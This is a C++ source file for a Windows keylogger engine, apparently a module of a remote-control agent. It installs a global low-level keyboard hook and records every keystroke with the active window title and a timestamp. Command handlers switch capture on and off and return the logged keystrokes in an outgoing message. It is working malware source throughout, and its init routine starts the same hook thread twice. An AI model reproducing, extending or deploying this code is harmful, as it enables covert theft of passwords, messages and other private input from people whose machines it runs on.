#include "Engine.hpp"

const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BKSPACE]" },
	{VK_RETURN,	"[ENTER]" },
	{VK_SPACE,	"[SPACE]" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CTRL]" },
	{VK_LCONTROL,	"[LCTRL]" },
	{VK_RCONTROL,	"[RCTRL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PGUP]" },
	{VK_NEXT,	"[PGDOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
    {VK_NUMLOCK, "[NUMLK]"},
	{VK_CAPITAL,	"[CAPSLK]" },
	{VK_DELETE, "[DELETE]"},
    {VK_F1, "[F1]"}, 
    {VK_F2, "[F2]"}, 
    {VK_F3, "[F3]"}, 
    {VK_F4, "[F4]"}, 
    {VK_F5, "[F5]"}, 
    {VK_F6, "[F6]"}, 
    {VK_F7, "[F7]"}, 
    {VK_F8, "[F8]"}, 
    {VK_F9, "[F9]"}, 
    {VK_F10, "[F10]"}, 
    {VK_F11, "[F11]"}, 
    {VK_F12, "[F12]"}, 
    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
    {VK_VOLUME_UP, "[VOLUME_UP]"},
    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"}
};

HHOOK keyloggerHook = nullptr;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		KeyloggerEngine::getInstance().write(kbdStruct.vkCode);
	}
	return CallNextHookEx(keyloggerHook, nCode, wParam, lParam);
}

bool KeyloggerEngine::init() {
    std::thread([this]() {
        hookThreadId = GetCurrentThreadId();
        keyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, ::HookCallback, NULL, 0);
        if (!keyloggerHook) {
            std::cerr << "Hook failed\n";
            return;
        }

        MSG msg;
        while (GetMessageW(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        (void) UnhookWindowsHookEx(keyloggerHook);
        keyloggerHook = nullptr;
    }).detach();
    std::thread([this]() {
        hookThreadId = GetCurrentThreadId();
        keyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, ::HookCallback, NULL, 0);
        if (!keyloggerHook) {
            std::cerr << "Hook failed\n";
            return;
        }

        MSG msg;
        while (GetMessageW(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        (void) UnhookWindowsHookEx(keyloggerHook);
        keyloggerHook = nullptr;
    }).detach();
    std::lock_guard<std::mutex> lock(bufferLock);
    buffer.clear();
    lastWindowTitle.clear();
    return true;
}

void KeyloggerEngine::shouldStop() {
    if (hookThreadId != 0) {
        PostThreadMessageW(hookThreadId, WM_QUIT, 0, 0);
    }
}

void KeyloggerEngine::write(int keyStroke) {
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;
    std::string tmpBuffer;

    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);

        WCHAR windowTitleWchar[260];
        char timeBuffer[65];
        memset(windowTitleWchar, 0, sizeof windowTitleWchar);
        memset(timeBuffer, 0, sizeof timeBuffer);

        if(GetWindowTextW(foreground, windowTitleWchar, 256) == 0) {
            windowTitle = "[[empty windows title]]";
            lastWindowTitle = windowTitle;
        }

        (void) WideStringToString(std::wstring(windowTitleWchar), windowTitle);
        if(lastWindowTitle != windowTitle) {
            lastWindowTitle = windowTitle;
            time_t t = time(NULL);
            struct tm tm;
            localtime_s(&tm, &t);
            strftime(timeBuffer, sizeof(timeBuffer), "%c", &tm);
            tmpBuffer = "\n[Window: " + windowTitle + " - at " + timeBuffer + " ]\n";
        }

        if (keyname.find(keyStroke) != keyname.end()) {
            tmpBuffer += keyname.at(keyStroke);
        } else {
            char key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);
            if (key != 0) {  // Only process if it's a valid character
                bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
                if ((GetKeyState(VK_SHIFT) & 0x1000)) lowercase = !lowercase;
                if (!lowercase) key = tolower(key);
                tmpBuffer += key;
            } else {
                tmpBuffer += "[UNKNOWN_KEY]";
            }
        }

        //Only try modifying the buffer.
        //It's ok to miss some key stroke to ensure deadlock-free
        // std::cout << "beat\n";
        if(bufferLock.try_lock()) {
            // std::cout << "Lock append buffer ok\n";
            buffer += tmpBuffer;
            bufferLock.unlock();
        }
    }
}

std::string KeyloggerEngine::read() {
    // std::cout << "Can i read?\n";
    std::lock_guard<std::mutex> lock(bufferLock);
    // std::cout << "yes i can read?\n";
    return buffer;
}

KeyloggerEngine::~KeyloggerEngine() {
    shouldStop();
}

//Should call this periodically, free up buffer, prevent std::string *unlikely* failure
//if buffer length is smaller than specified, string with buffer length is returned
std::string KeyloggerEngine::extract(int length) {
    std::lock_guard<std::mutex> lock(bufferLock);
    int sz = std::min((int) buffer.size(), length);
    std::string buffer2 = buffer.substr(0, sz);
    buffer.erase(buffer.begin(), buffer.begin()+sz);
    return buffer2;
}

int EnableKeyloggerHandler(const Message& inputMessage, Message& outputMessage) {
    json outputJson;
    if(!preliminaryEngineMessageCheck(MessageEnableKeylog, inputMessage, outputMessage, outputJson)) return 0;

    if(KeyloggerEngine::getInstance().init()) {
        outputMessage.commandNumber = MessageEnableKeylog;
        outputMessage.returnCode = 1;
        outputJson["errorString"] = "OK";
        return 1;
    } else {
        outputMessage.commandNumber = MessageEnableKeylog;
        outputMessage.returnCode = 0;
        outputJson["errorString"] = "Failed to hook";
        return 0;
    }
}

int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage) {
    json outputJson;
    if(!preliminaryEngineMessageCheck(MessageDisableKeylog, inputMessage, outputMessage, outputJson)) return 0;

    KeyloggerEngine::getInstance().shouldStop();
    std::string capture = KeyloggerEngine::getInstance().read();

    // std::cout << "DisableKeyloggerHandler debug: " << capture.size() << "\n";  

    outputMessage.commandNumber = MessageDisableKeylog;
    outputMessage.returnCode = 1;
    outputJson["errorString"] = "OK";
    outputMessage.setJsonData(outputJson);
    outputMessage.setBinaryData(capture.data(), capture.size());
    return 1;
}